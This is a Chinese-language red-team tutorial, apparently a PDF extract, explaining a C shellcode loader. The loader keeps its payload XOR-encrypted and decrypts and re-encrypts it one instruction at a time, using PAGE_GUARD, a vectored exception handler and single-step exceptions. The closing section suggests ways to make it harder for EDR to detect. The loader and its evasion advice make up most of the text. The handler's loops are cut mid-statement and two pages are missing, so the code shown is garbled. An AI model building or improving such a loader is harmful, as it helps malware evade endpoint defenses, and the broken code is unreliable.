单步加解密执行shellcode
0x00 前言
国庆收假，看见这么一段代码，非常有意思。文字不太好表述代码的执行流程，如图所示：
这个图没有很多执行细节，因此并不是很准确，但是已经能够表达我的意思了。简短的说，就是 边解密 
边执行 再加密，这样内存中只有很小的一部分代码是“明文”状态，其他的代码都是“密文”状态。
上图只是一个概念图，真正编写代码是细节到单条指令的，具体代码：
https://gist.github.com/jackullrich/ce3b5263e05c88548b175f4f21909384
在这段代码中，我站在新手同学角度思考，可能有以下几个地方需要理解：
typedef VOID(__stdcall* Shellcode)();
向量化异常处理（AddVectoredExceptionHandler）
详细的执行流程
其他部分都非常好理解，下面我们开始读代码，并解释以上问题。
0x01 阅读代码
我把代码拆分为几段：
第一段
Produced by AttackTeamFamily - Author: L.N. - Date: 2021-10-09
No. 1 / 7 - Welcome to www.red-team.cn
这段代码中，头文件、函数声明和全局变量，都是基础的C语言编程，不用解释，但是其中的：
这段代码，我刚学C的时候，不太理解，后来才知道被书误导了，通常我们学习typedef的时候是和
#define做对比，例如这个菜鸟教程：https://www.runoob.com/cprogramming/c-typedef.html，如
下：
C 语言提供了 typedef 关键字，您可以使用它来为类型取一个新的名字。下面的实例为单字节数
字定义了一个术语 BYTE：
在这个类型定义之后，标识符 BYTE 可作为类型 unsigned char 的缩写，例如：
这样就很难理解上面的代码了，正确的理解typedef，应该是这样的https://blog.csdn.net/weixin_4225
5385/article/details/82261774：
typedef用来声明一个别名，typedef后面的语法，是一个声明。本来笔者以为这里不会产生什么
误解的，但结果却出乎意料，产生误解的人不在少数。罪魁祸首又是那些害人的教材。在这些教材
中介绍typedef的时候通常会写出如下形式：
typedef int PARA;
这种形式跟#define int PARA几乎一样，如前面几章所述，这些教材的宗旨是由浅入深，但实际做
出来的行为却是以偏盖全。的确，这种形式在所有形式中是最简单的，但却没有对typedef进一步
解释，使得不少人用#define的思维来看待typedef，把int与PARA分开来看，int是一部分，PARA
是另一部分，但实际上根本就不是这么一回事。int与PARA是一个整体！就象int i:声明一样是一个
整体声明，只不过int i定义了一个变量，而typedef定义了一个别名。这些人由于持有这种错误的
观念，就会无法理解如下一些声明：
typedef int a[10]; 
typedef void (*p)(void);
他们会以为a[10]是int的别名，(*p)(void)是void的别名，但这样的别名看起来又似乎不是合法的名
字，于是陷入困惑之中。实际上，上面的语句把a声明为具有10个int元素的数组的类型别名，p是
一种函数指针的类型别名。
虽然在功能上，typedef可以看作一个跟int PARA分离的动作，但语法上typedef属于存储类声明
说明符，因此严格来说，typedef int PARA整个是一个完整的声明。
#include 
LONG SingleStepEncryptDecrypt(EXCEPTION_POINTERS* ExceptionInfo);
typedef VOID(__stdcall* Shellcode)();
LPBYTE ShellcodeBuffer;
ULONG_PTR PreviousOffset;
ULONG_PTR CurrentOffset;
ULONGLONG InstructionCount;
DWORD dwOld;
typedef VOID(__stdcall* Shellcode)();
typedef unsigned char BYTE;
BYTE  b1, b2;
Produced by AttackTeamFamily - Author: L.N. - Date: 2021-10-09
No. 2 / 7 - Welcome to www.red-team.cn
定义一个函数指针类型。
比如原函数是  void  func(void); 
那么定义的函数指针类型就是typedef  void  (*Fun)(void); 
然后用此类型生成一个指向函数的指针：  Fun  func1; 
当func1获取函数地址之后，那么你就可以向调用原函数那样来使用这个函数指针：  func1(void);
第二段
这段执行shellcode的代码很容易理解，但是其中AddVectoredExceptionHandler和
RemoveVectoredExceptionHandler是什么呢？
简单的说就是一个异常处理函数的注册和删除API，当我们的代码出现异常时，就会调用这个API注册的
回调函数来处理异常，然后根据返回判断是否继续执行程序。当然里面还有很多其他知识，具体可以阅
读https://blog.csdn.net/diamont/article/details/4259707。
我们再来回看我们的代码中的：
我们在修改shellcode的内存页的时候，不仅修改属性为可读可执行，同时设置了PAGE_GUARD，这是
什么呢？
PAGE_GUARD： 区域第一次被访问时进入一个STATUS_GUARD_PAGE异常，这个标志要和其他
保护标志合并使用，表明区域被第一次访问的权限
通俗的说，就是当我们执行shellcode之前，由于内存页配置了PAGE_GUARD，这个时候就会触发
STATUS_GUARD_PAGE异常。出现异常，那么我们使用AddVectoredExceptionHandler注册的异常处
理函数SingleStepEncryptDecrypt就会被调用。
int main(void)
{
    AddVectoredExceptionHandler(TRUE, 
(PVECTORED_EXCEPTION_HANDLER)SingleStepEncryptDecrypt);
    //分配内存,设置属性为可读可写
    ShellcodeBuffer = (LPBYTE)VirtualAlloc(NULL, 0x1000, MEM_COMMIT | 
MEM_RESERVE, PAGE_READWRITE);
    InstructionCount = 0;
    if (ShellcodeBuffer)
    {
        //写入加密的shellcode
        RtlCopyMemory(ShellcodeBuffer, Shellcode_XOR_FF, 
sizeof(Shellcode_XOR_FF));
        //修改内存页属性为可读可执行
        if (VirtualProtect(ShellcodeBuffer, 0x1000, PAGE_EXECUTE_READ | 
PAGE_GUARD, &dwOld))
        {
            //利用函数指针执行shellcode
            Shellcode AntiMem = (Shellcode)ShellcodeBuffer;
            AntiMem();
        }
    }
RemoveVectoredExceptionHandler((PVECTORED_EXCEPTION_HANDLER)SingleStepEncryptDec
rypt);
}
if (VirtualProtect(ShellcodeBuffer, 0x1000, PAGE_EXECUTE_READ | PAGE_GUARD, 
&dwOld))
Produced by AttackTeamFamily - Author: L.N. - Date: 2021-10-09
No. 3 / 7 - Welcome to www.red-team.cn
第三段
我们来分析下这个函数，这个函数的传入参数为：
LONG SingleStepEncryptDecrypt(EXCEPTION_POINTERS* ExceptionInfo)
{
    BYTE* currentBlock128 = NULL;
    CurrentOffset = (ULONG_PTR)ExceptionInfo->ExceptionRecord->ExceptionAddress 
- (ULONG_PTR)ShellcodeBuffer;
    if (ExceptionInfo->ExceptionRecord->ExceptionCode == EXCEPTION_GUARD_PAGE)
    {
        // This is a naive disassembler
        // Hopefully no instruction is longer than 16 bytes 
        currentBlock128 = (BYTE*)((ULONG_PTR)ShellcodeBuffer + CurrentOffset);
        PreviousOffset = CurrentOffset;
        // Decrypt next 16-byte block
        VirtualProtect(ShellcodeBuffer, 0x1000, PAGE_READWRITE, &dwOld);
        for (size_t i = 0; i ContextRecord->EFlags |= 0x100;
        InstructionCount++;
        // Execute next instruction
        // Triggers EXCEPTION_SINGLE_STEP
        return EXCEPTION_CONTINUE_EXECUTION;
    }
    else if (ExceptionInfo->ExceptionRecord->ExceptionCode == 
EXCEPTION_SINGLE_STEP)
    {
        currentBlock128 = (BYTE*)((ULONG_PTR)ShellcodeBuffer + PreviousOffset);
        // Re-encrypt the 16-byte block
        VirtualProtect(ShellcodeBuffer, 0x1000, PAGE_READWRITE, &dwOld);
        for (size_t i = 0; i ExceptionRecord->ExceptionCode == EXCEPTION_GUARD_PAGE)
else if (ExceptionInfo->ExceptionRecord->ExceptionCode == 
EXCEPTION_SINGLE_STEP)
Produced by AttackTeamFamily - Author: L.N. - Date: 2021-10-09
No. 6 / 7 - Welcome to www.red-team.cn
0x02 总结
原理就是这样了，但是这段代码还有很多优化的地方：
1. 单字节亦或，针对内存扫描还是弱了点，一些EDR能够自动解单字节xor
2. 这段代码是直接分配了0x1000长度的内存放加密的shellcode，这个需要根据实际情况分配，万一
你shellcode大于0x1000，就要出错了。
3. 代码是以16 bytes为单位的加解密，在shellcode的尾部不足16 bytes的时候需要做一下判断，这样
更好点。
Produced by AttackTeamFamily - Author: L.N. - Date: 2021-10-09
No. 7 / 7 - Welcome to www.red-team.cn